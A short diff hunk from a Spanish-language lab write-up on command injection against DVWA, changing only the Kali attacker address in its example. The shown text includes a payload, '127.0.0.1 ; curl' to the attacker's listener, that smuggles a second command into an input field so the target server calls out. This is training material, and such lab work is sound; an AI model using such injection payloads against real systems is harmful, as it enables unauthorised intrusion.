@@ -429,10 +429,10 @@ kali@kali:~$ python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-Se inyecta el siguiente payload para que el servidor DVWA haga una petición HTTP hacia Kali (`10.0.2.250`) en el puerto `8000`:
+Se inyecta el siguiente payload para que el servidor DVWA haga una petición HTTP hacia Kali (`192.168.100.250`) en el puerto `8000`:
 
 ```bash
-127.0.0.1 ; curl http://10.0.2.250:8000/test
+127.0.0.1 ; curl http://192.168.100.250:8000/test
 ```
 
 Si la inyección funciona, en la terminal de Kali aparece la conexión entrante:
